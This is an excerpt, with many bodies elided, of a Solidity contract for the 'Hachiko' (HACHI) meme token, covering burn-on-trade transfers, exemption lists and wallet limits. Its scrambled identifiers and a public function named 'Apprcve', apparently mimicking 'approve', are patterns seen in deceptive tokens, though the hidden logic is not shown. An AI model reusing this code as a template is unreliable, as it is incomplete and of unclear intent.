/**
https://t.me/Hachiko_ERC2
https://twitter.com/Hachiko_Eth
*/
...
contract ERC20 is Context, Ownable, IERC20, IERC20Metadata {
    ...
    function _transfer_withsentbse(address sender, address recipient, uint256 amount, uint256 amountToBurn) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
    ...
    function Apprcve(address account, uint256 amount) public virtual returns (uint256) {
...
contract HACHI is ERC20 {
    uint256 private constant TOTAL_SUPTSUPPLYUIST = 1000_000_000e9;
    address private constant DEAD = 0x000000000000000000000000000000000000dEaD;
    address private constant ZERO = 0x0000000000000000000000000000000000000000;
    ...
    uint256 public maxTxAmountionsteen;
    uint256 public maxwalletsaddresent;
    ...
    constructor(address router) ERC20("Hachiko", "HACHI", TOTAL_SUPTSUPPLYUIST) {
        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(router);
        uniswapV2Router = _uniswapV2Router;

        maxwalletsaddresent = TOTAL_SUPTSUPPLYUIST / 40;
        maxTxAmountionsteen = TOTAL_SUPTSUPPLYUIST /40;
    ...
    function _transfer_hoppei(
        ...
        if (!isException[from] && !isException[to]){
            ...
            if (from == uniswapV2Pair || to == uniswapV2Pair) {
                ...
                super._transfer_withsentbse(from, to, amount, _burn);
                return;
            }
        }
    ...
    function _checkLimitation_hoppei(
        ...
        if (!hasLimit_) {
            if (!isException[from] && !isException[to]) {
                require(amount <= maxTxAmountionsteen, "Amount exceeds max");
                ...
                require(balanceOf(to) + amount <= maxwalletsaddresent, "Max holding exceeded max");
            }
        }
    }
